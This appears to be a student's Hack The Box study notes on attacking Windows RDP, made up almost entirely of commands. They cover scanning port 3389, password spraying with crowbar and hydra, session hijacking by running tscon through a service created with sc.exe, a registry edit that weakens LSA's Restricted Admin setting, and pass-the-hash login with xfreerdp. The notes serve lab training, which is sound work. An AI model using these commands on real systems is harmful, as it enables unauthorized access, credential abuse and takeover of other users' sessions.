
```shell
3kjS@htb[/htb] nmap -Pn -p3389 192.168.2.143
```
#### Crowbar - RDP Password Spraying

```shell
3kjS@htb[/htb] crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```
#### Hydra - RDP Password Spraying

```shell
3kjS@htb[/htb] hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
## Protocol Specific Attacks
#### RDP Session Hijacking
![[Pasted image 20260514165056.png]]

```cmd
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

```cmd
C:\htb> query user

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13" 

[SC] CreateService SUCCESS
```
![[Pasted image 20260514165512.png]]


To run the command, we can start the `sessionhijack` service :

```cmd
C:\htb> net start sessionhijack
```
## RDP Pass-the-Hash (PtH)
![[Pasted image 20260514165724.png]]
#### Adding the DisableRestrictedAdmin Registry Key

```cmd
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
![[Pasted image 20260514165738.png]]

```shell
3kjS@htb[/htb] xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```
